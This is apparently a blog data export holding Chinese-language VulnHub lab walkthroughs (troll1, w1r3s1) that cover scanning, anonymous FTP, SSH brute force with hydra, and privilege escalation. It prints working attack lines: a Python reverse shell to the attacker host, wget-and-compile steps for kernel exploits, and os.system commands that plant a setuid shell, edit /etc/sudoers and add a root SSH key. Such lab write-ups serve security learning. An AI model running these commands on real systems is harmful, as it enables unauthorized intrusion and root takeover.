&gt; exploit [*] Started reverse TCP handler on 192.168.2.172:4444 [*] Running automatic check (&quot;set AutoCheck false&quot; to disable)[+] The target appears to be vulnerable.[*] Uploading payload to target[*] Attempting to login with su[*] Exploit completed, but no session was created.\n\n\n缓冲区溢出???\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-troll1","url":"/2022/08/04/vulnhub-troll1/","content":"概述信息收集主机发现nmap -sP  192.168.2.0/24Nmap scan report for 192.168.2.133Host is up (0.012s latency).\n\n\n\n\n\n端口扫描nmap -p-  192.168.2.133 Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.133Host is up (0.024s latency).Not shown: 65532 closed tcp ports (conn-refused)PORT   STATE SERVICE21/tcp open  ftp22/tcp open  ssh80/tcp open  http\n\nsudo nmap -p 21,22,80 -A -T4 -sS 192.168.2.133[sudo] password for kali: Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.133Host is up (0.046s latency).PORT   STATE SERVICE VERSION21/tcp open  ftp     vsftpd 3.0.2| ftp-anon: Anonymous FTP login allowed (FTP code 230)|_-rwxrwxrwx    1 1000     0            8068 Aug 10  2014 lol.pcap [NSE: writeable]| ftp-syst: |   STAT: | FTP server status:|      Connected to 192.168.2.136|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 600|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 3|      vsFTPd 3.0.2 - secure, fast, stable|_End of status22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 d6:18:d9:ef:75:d3:1c:29:be:14:b5:2b:18:54:a9:c0 (DSA)|   2048 ee:8c:64:87:44:39:53:8c:24:fe:9d:39:a9:ad:ea:db (RSA)|   256 0e:66:e6:50:cf:56:3b:9c:67:8b:5f:56:ca:ae:6b:f4 (ECDSA)|_  256 b2:8b:e2:46:5c:ef:fd:dc:72:f7:10:7e:04:5f:25:85 (ED25519)80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))| http-robots.txt: 1 disallowed entry |_/secret|_http-title: Site doesn&#x27;t have a title (text/html).|_http-server-header: Apache/2.4.7 (Ubuntu)MAC Address: 50:2B:73:A0:02:39 (Tenda Technology,Ltd.Dongguan branch)Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed portDevice type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Network Distance: 1 hopService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernelTRACEROUTEHOP RTT      ADDRESS1   46.43 ms 192.168.2.133OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 11.02 seconds\n\n\n\n目录遍历dirsearch -u http://192.168.2.133/ -x 403 -r\n\n\n​\t使用dirsearch没有找到有用的信息。\nftp匿名​\t从上面的端口的服务探测，可以看到ftp可以匿名登录，而且下面存在一个lol.pcap文件。\nftp 192.168.2.133\n\n\nWireshark​\t通过Wireshark追踪tcp流\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n​\ttcp.stream 1和3都显示文件secret_stuff.txt，tcp.stream 2内容如下：\nWell, well, well, aren&#x27;t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-PSucks, you were so close... gotta TRY HARDER!——————————翻译————————好吧，好吧，你不只是一个聪明的小恶魔吗，你几乎找到了 sup3rs3cr3tdirlol :-P糟透了，你离得太近了……得加倍努力！\n\nsecret_stuff.txtsup3rs3cr3tdirlol\n\nsup3rs3cr3tdirlol​\tweb的根目录和secret目录下均没找到secret_stuff.txt，但在根目录下找到了sup3rs3cr3tdirlol路径。\nhttp://192.168.2.133/sup3rs3cr3tdirlol/\n\n\n​\t将文件下载后通过strings查看一下文件的字符串。\nwget http://192.168.2.133/sup3rs3cr3tdirlol/roflmao strings roflmao\n\n\nFind address 0x0856BF to proceed\n\n0x0856BF\n\n\n\n\n\n\n\n\n\n收集到的信息\ngood_luckwhich_one_lol.txtmaleusps-auxfeluxEagle11genphluxusmc8892blawrgwytshadowvis1t0roverflowthis_folder_contains_the_passwordPass.txtGood_job_:)\n\n\n\n漏洞利用ssh爆破​\t将收集到的信息放到文件dic.txt中，爆破登录账号密码。\nhydra -L dic.txt -P dic.txt ssh://192.168.2.133:22[22][ssh] host: 192.168.2.133   login: overflow   password: Pass.txt\n\n\n\n权限提升wget http://192.168.2.136:1111/linpeas.shchmod +x linpeas.sh./linpeas.sh\n\nwget http://192.168.2.136:1111/40839.cgcc -pthread 40839.c -o dirty -lcryptwget http://192.168.2.136:1111/a.cppg++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow a.cpp -lutilwget http://192.168.2.136:1111/40839.cgcc -pthread 40839.c -o dirty -lcrypt\n\nofssearchsploit 37292cp /usr/share/exploitdb/exploits/linux/local/37292.c ./\n\nwget http://192.168.2.136:1111/37292.cgcc 37292.c -o ofs./ofs\n\n\n计划任务—执行py脚本\n脚本跑出来的可以写的文件中，\n\n\n\n\n\n\n\n\n​\t修改次脚本来提权。\n反弹shellimport socket,subprocess,oss=socket.socket(socket.AF_INET,socket.SOCK_STREAM)s.connect((&quot;192.168.2.136&quot;,2233))os.dup2(s.fileno(),0)os.dup2(s.fileno(),1)os.dup2(s.fileno(),2)p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);\n\n\nos.system执行系统命令创建root可执行程序os.system(&#x27;cp /bin/sh /tmp/exp&#x27;)os.system(&#x27;chmod u+s /tmp/exp&#x27;)\n\n$ ./exp# iduid=1002(overflow) gid=1002(overflow) euid=0(root) groups=0(root),1002(overflow)# whoamiroot\n\n\n\n添加用户到&#x2F;etc&#x2F;sudoers将用户溢出添加到sudoers文件中可以sudo su到root用户\nos.system(&#x27;echo &quot;overflow ALL=(ALL) ALL&quot; &gt;&gt; /etc/sudoers&#x27;)\n\n\n\n写入id_rsa.pubos.system(&#x27;mkdir /root/.ssh; chmod 775 .ssh; echo &quot;ssh-rsa *&quot; &gt;&gt; /root/.ssh/authorized_keys&#x27;)\n\n\nflag# cat proof.txtGood job, you did it! 702a8c18d29c6f3ca0d99ef5712bfbdc\n\n\n","categories":["vulnhub"],"tags":["vulnhub"]},{"title":"vulnhub-w1r3s1","url":"/2022/08/05/vulnhub-w1r3s1/","content":"概要信息收集获取靶机IPnmap -sP  192.168.2.0/24Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-11 09:22 CSTNmap scan report for 192.168.2.152Host is up (0.0083s latency).\n\n端口服务扫描nmap -p- -T5  192.168.2.152Starting Nmap 7.92 ( https://nmap.org ) Warning: 192.168.2.152 giving up on port because retransmission cap hit (2).Nmap scan report for 192.168.2.152Host is up (0.010s latency).Not shown: 55528 filtered tcp ports (no-response), 10003 closed tcp ports (conn-refused)PORT     STATE SERVICE21/tcp   open  ftp22/tcp   open  ssh80/tcp   open  http3306/tcp open  mysql\n\nnmap -p 21,22,80,3306 -sV -A -T5  192.168.2.152Starting Nmap 7.92 ( https://nmap.org ) Nmap scan report for 192.168.2.152Host is up (0.0068s latency).PORT     STATE SERVICE VERSION21/tcp   open  ftp     vsftpd 2.0.8 or later| ftp-anon: Anonymous FTP login allowed (FTP code 230)| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 content| drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docs|_drwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees| ftp-syst: |   STAT: | FTP server status:|      Connected to ::ffff:192.168.2.153|      Logged in as ftp|      TYPE: ASCII|      No session bandwidth limit|      Session timeout in seconds is 300|      Control connection is plain text|      Data connections will be plain text|      At session startup, client count was 3|      vsFTPd 3.0.3 - secure, fast, stable|_End of status22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 07:e3:5a:5c:c8:18:65:b0:5f:6e:f7:75:c7:7e:11:e0 (RSA)|   256 03:ab:9a:ed:0c:9b:32:26:44:13:ad:b0:b0:96:c3:1e (ECDSA)|_  256 3d:6d:d2:4b:46:e8:c9:a3:49:e0:93:56:22:2e:e3:54 (ED25519)80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))|_http-title: Apache2 Ubuntu Default Page: It works|_http-server-header: Apache/2.4.18 (Ubuntu)3306/tcp open  mysql   MySQL (unauthorized)Service Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 12.28 seconds\n\n\n\n目录扫描dirsearch -u http://192.168.2.152/ -x 403     _|. _ _  _  _  _ _|_    v0.4.2                                                                                             (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                                 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927Output File: /home/kali/.dirsearch/reports/192.168.2.152/-_22-08-11_10-29-07.txtError Log: /home/kali/.dirsearch/logs/errors-22-08-11_10-29-07.logTarget: http://192.168.2.152/[10:29:07] Starting: [10:29:12] 301 -  322B  - /administrator  -&gt;  http://192.168.2.152/administrator/[10:29:12] 302 -    7KB - /administrator/  -&gt;  installation/                [10:29:12] 302 -    7KB - /administrator/index.php  -&gt;  installation/       [10:29:16] 200 -   11KB - /index.html                                       [10:29:16] 301 -  319B  - /javascript  -&gt;  http://192.168.2.152/javascript/ [10:29:23] 301 -    0B  - /wordpress/  -&gt;  http://localhost/wordpress/      [10:29:23] 200 -    2KB - /wordpress/wp-login.php                                                                                                        Task Completed                                                                                                                               \n\nftp匿名登录​\t通过nmap扫描发现存在ftp匿名登录，然后登录之后把所有文件的下载下来，然后挨个看每个里面的内容。\nftp 192.168.2.152Connected to 192.168.2.152.220 Welcome to W1R3S.inc FTP service.Name (192.168.2.152:kali): anonymous       331 Please specify the password.Password: 230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; ls229 Entering Extended Passive Mode (|||45870|)150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 contentdrwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docsdrwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees226 Directory send OK.ftp&gt; cd content250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||45488|)150 Here comes the directory listing.-rw-r--r--    1 ftp      ftp            29 Jan 23  2018 01.txt-rw-r--r--    1 ftp      ftp           165 Jan 23  2018 02.txt-rw-r--r--    1 ftp      ftp           582 Jan 23  2018 03.txt226 Directory send OK.ftp&gt; get 01.txtlocal: 01.txt remote: 01.txt229 Entering Extended Passive Mode (|||48220|)150 Opening BINARY mode data connection for 01.txt (29 bytes).100% |*******************************************************************************|    29        2.52 KiB/s    00:00 ETA226 Transfer complete.29 bytes received in 00:00 (1.63 KiB/s)ftp&gt; get 02.txtlocal: 02.txt remote: 02.txt229 Entering Extended Passive Mode (|||47208|)150 Opening BINARY mode data connection for 02.txt (165 bytes).100% |*******************************************************************************|   165        3.34 MiB/s    00:00 ETA226 Transfer complete.165 bytes received in 00:00 (13.15 KiB/s)ftp&gt; get 03.txtlocal: 03.txt remote: 03.txt229 Entering Extended Passive Mode (|||43815|)150 Opening BINARY mode data connection for 03.txt (582 bytes).100% |*******************************************************************************|   582        4.40 MiB/s    00:00 ETA226 Transfer complete.582 bytes received in 00:00 (84.45 KiB/s)ftp&gt; cd ..250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||41195|)150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 contentdrwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docsdrwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees226 Directory send OK.ftp&gt; cd docs250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||43374|)150 Here comes the directory listing.-rw-r--r--    1 ftp      ftp           138 Jan 23  2018 worktodo.txt226 Directory send OK.ftp&gt; get worktodo.txtlocal: worktodo.txt remote: worktodo.txt229 Entering Extended Passive Mode (|||41926|)150 Opening BINARY mode data connection for worktodo.txt (138 bytes).100% |*******************************************************************************|   138       72.88 KiB/s    00:00 ETA226 Transfer complete.138 bytes received in 00:00 (14.45 KiB/s)ftp&gt; cd ..250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||40756|)150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 contentdrwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docsdrwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees226 Directory send OK.ftp&gt; cd new-employees250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||45320|)150 Here comes the directory listing.-rw-r--r--    1 ftp      ftp           155 Jan 28  2018 employee-names.txt226 Directory send OK.ftp&gt; get employee-names.txtlocal: employee-names.txt remote: employee-names.txt229 Entering Extended Passive Mode (|||46214|)150 Opening BINARY mode data connection for employee-names.txt (155 bytes).100% |*******************************************************************************|   155       14.17 KiB/s    00:00 ETA226 Transfer complete.155 bytes received in 00:00 (8.88 KiB/s)ftp&gt; cd ..250 Directory successfully changed.ftp&gt; ls229 Entering Extended Passive Mode (|||49315|)150 Here comes the directory listing.drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 contentdrwxr-xr-x    2 ftp      ftp          4096 Jan 23  2018 docsdrwxr-xr-x    2 ftp      ftp          4096 Jan 28  2018 new-employees226 Directory send OK.ftp&gt; exit221 Goodbye.\n\n​\t第一个密文不知道是什么加密，使用hash-identifier进行解密。可能是md5，然后去\nhttps://www.somd5.com/解密。\nhash-identifier 01ec2d8fc11c493b25029fb1f47f39ce\n\n\n\n\n​\t第二个加密字符串：\necho &quot;SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg==&quot; | base64 --decode\n\n\n​\t其他的文件：\n\n\n漏洞利用​\tftp服务下载下来的文件没发现什么可以利用的信息，然后就去搜索了一下dirsearch发现的路径:\nhttp://192.168.2.152/administrator/installation/\n\n​\t随意填写后点击next，发现这里显示已经修改了Configuration.php，此时在想，在数据库账号密码不正确的情况下也能修改配置文件的话，这里想试试能不能通过改变传入的参数来插入自己的代码。\n\n\n文件包含​\t多次尝试无果后Google该cms的公开漏洞。\nhttps://www.exploit-db.com/exploits/25971\n\n​\t\n\n破解shadow\njohn shadow.txt\n\n\n​\twww-data用户登录不了，使用w1r3s用户登录。\n\n\n权限提升​\t登录用户w1r3s用户后，输入id发现有sudo权限，直接使用sudo su获取最高权限。\n\nflag\n","categories":["vulnhub"],"tags":["vulnhub"]}]